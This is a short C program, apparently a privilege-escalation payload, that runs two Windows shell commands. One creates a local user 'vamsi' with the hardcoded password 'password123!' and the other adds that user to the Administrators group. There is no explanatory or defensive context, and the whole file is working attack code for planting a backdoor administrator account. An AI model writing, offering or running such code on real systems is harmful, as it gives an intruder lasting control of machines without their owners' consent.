//Password for user vamsi is password123!


#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user vamsi password123! /add");
  i = system ("net localgroup administrators vamsi /add");
  
  return 0;
}
